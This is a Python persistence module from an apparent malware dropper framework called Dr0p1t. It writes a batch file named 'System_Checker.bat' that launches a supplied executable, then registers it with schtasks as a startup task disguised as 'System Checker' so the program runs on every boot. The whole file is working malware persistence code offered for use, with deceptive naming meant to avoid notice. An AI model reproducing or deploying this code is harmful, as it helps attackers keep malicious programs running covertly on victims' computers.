#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to to add your exe file to task scheduler
#Start

#Batchfile to check for the process
def create_baty(exe):
    code = """@echo off
cls
TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "=" > ch
findstr /B /I {} ch >nul
if %errorlevel%==0  goto :pass
goto :create

:pass
del ch >nul
:create
{} >nul
del ch >nul""".format( exe,exe )
    f = open( "System_Checker.bat","w" )
    f.write(code)
    f.close()

#Create a task to check for the task
def create_checker(exe):
    import os
    x = os.popen("echo %temp%")
    path = "\\".join( str( x.read().strip() ).split( "\\" )[:-1] )
    full_path = path + "\\" + "System_Checker.bat"
    if "System Checker" not in os.popen("schtasks /query").read().strip():
        create_baty(exe)
        blah = os.popen( 'SCHTASKS /CREATE /SC ONSTART /TN "System Checker" /TR {} >nul'.format( full_path ) )

create_checker(File)
